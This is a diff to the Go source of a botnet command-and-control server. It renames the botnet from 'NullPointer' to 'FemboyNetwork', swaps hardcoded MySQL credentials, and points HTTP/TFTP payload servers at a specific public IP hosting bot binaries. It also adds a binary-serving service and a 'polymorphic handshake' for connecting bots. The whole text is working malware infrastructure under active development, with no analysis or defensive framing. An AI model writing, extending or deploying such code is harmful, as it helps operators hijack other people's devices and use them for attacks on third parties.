@@ -28,12 +28,12 @@ func main() {
 			AdminListen: "0.0.0.0:34131",
 			ScanListen:  "0.0.0.0:34130",
 			MysqlAddr:   "127.0.0.1:3306",
-			MysqlUser:   "nullpointer",
-			MysqlPass:   "nullpointer",
-			MysqlTable:  "NullPointer",
+			MysqlUser:   "fnbnet",
+			MysqlPass:   "fnbnet",
+			MysqlTable:  "FemboyNetwork",
 			HttpServer:  "195.209.219.35",
 			TftpServer:  "195.209.219.35",
-			BinPrefix:   "nullpointer",
+			BinPrefix:   "fnbnet",
 			BinPath:     "/var/www/html/bins",
 		}
 		cfg = c
@@ -42,13 +42,16 @@ func main() {
 	protoInit(cfg.ProtoKey)
 
 	go listenAdmin(c.AdminListen)
+	if _, err := StartBinaryService(); err != nil {
+		fmt.Println("binary service:", err)
+	}
 	tel, err := net.Listen("tcp", c.CncListen)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	fmt.Println("[ NullPointer CNC ready ]")
+	fmt.Println("[ FemboyNetwork CNC ready ]")
 	fmt.Println("  bots:  ", c.CncListen)
 	fmt.Println("  admin: ", c.AdminListen)
 
@@ -131,7 +134,17 @@ func botHandler(conn net.Conn) {
 	if debugMode {
 		log.Printf("[cnc] bot connected %s ver=%d source=%s", conn.RemoteAddr(), ver, source)
 	}
-	NewBot(conn, ver, source).Handle()
+
+	// polymorphic handshake
+	ctx := &HandshakeCtx{}
+	if err := polymorphicHandshakeRespond(conn, ctx); err != nil {
+		if debugMode {
+			log.Printf("[cnc] polymorphic handshake failed from %s: %v", conn.RemoteAddr(), err)
+		}
+		return
+	}
+
+	NewBot(conn, ver, source, ctx).Handle()
 }
 
 func readXBytes(conn net.Conn, buf []byte) error {
